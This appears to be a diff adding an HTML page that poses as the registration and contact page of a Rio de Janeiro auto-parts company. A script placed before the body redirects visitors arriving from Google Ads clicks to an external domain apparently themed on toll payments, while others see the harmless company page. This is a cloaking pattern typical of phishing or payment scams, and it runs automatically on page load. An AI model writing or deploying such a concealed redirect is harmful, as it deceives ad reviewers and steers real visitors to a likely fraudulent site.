@@ -1,1 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Altese Auto Peças LTDA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #1f2937;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #111827;
+            padding: 10px;
+            text-align: center;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+        }
+        section {
+            padding: 40px 20px;
+            max-width: 1000px;
+            margin: auto;
+            background-color: white;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.05);
+        }
+        h2 {
+            color: #1f2937;
+        }
+        footer {
+            background-color: #1f2937;
+            color: white;
+            text-align: center;
+            padding: 15px;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        @media (max-width: 768px) {
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+  <script>
 
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www2-pedagio.digital/3289';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+    <h1>Altese Auto Peças LTDA</h1>
+    <p>Comércio de Peças e Acessórios Automotivos</p>
+</header>
+
+<nav>
+    <a href="#empresa">A Empresa</a>
+    <a href="#registro">Registro</a>
+    <a href="#contato">Contato</a>
+    <a href="#localizacao">Localização</a>
+</nav>
+
+<section id="empresa">
+    <h2>Sobre a Empresa</h2>
+    <p>
+        A Altese Auto Peças LTDA atua no comércio varejista de peças e acessórios novos 
+        para veículos automotores. Fundada em 08/01/2013, é uma filial com situação 
+        cadastral ativa, oferecendo produtos de qualidade para manutenção e reposição automotiva.
+    </p>
+</section>
+
+<section id="registro">
+    <h2>Informações de Registro</h2>
+    <div class="info-grid">
+        <div><strong>CNPJ:</strong> 31.263.577/0004-62</div>
+        <div><strong>Razão Social:</strong> Altese Auto Peças LTDA</div>
+        <div><strong>Natureza Jurídica:</strong> Sociedade Empresária Limitada</div>
+        <div><strong>Tipo:</strong> Filial</div>
+        <div><strong>Data de Abertura:</strong> 08/01/2013</div>
+        <div><strong>Situação:</strong> Ativa</div>
+        <div><strong>Capital Social:</strong> R$ 85.000,00</div>
+        <div><strong>Porte:</strong> Sem Enquadramento</div>
+        <div><strong>Opção pelo MEI:</strong> Não</div>
+        <div><strong>Opção pelo Simples:</strong> Não</div>
+    </div>
+
+    <h3>Inscrições Estaduais</h3>
+    <ul>
+        <li>RJ: 79.904.45-7</li>
+        <li>PE: 1024722-03</li>
+        <li>PR: 09908469-36</li>
+        <li>RS: 900/0066013</li>
+        <li>SP: 819.015.669.112</li>
+    </ul>
+</section>
+
+<section id="contato">
+    <h2>Contato</h2>
+    <p><strong>E-mail:</strong> ad****@****.com.br</p>
+    <p><strong>Telefone:</strong> (21) 212****-****</p>
+</section>
+
+<section id="localizacao">
+    <h2>Localização</h2>
+    <p><strong>Endereço:</strong> Avenida Lobo Junior, 1256</p>
+    <p><strong>Bairro:</strong> Penha</p>
+    <p><strong>CEP:</strong> 21020-122</p>
+    <p><strong>Município:</strong> Rio de Janeiro - RJ</p>
+</section>
+
+<footer>
+    <p>&copy; 2025 Altese Auto Peças LTDA - Todos os direitos reservados.</p>
+</footer>
+
+</body>
+</html>
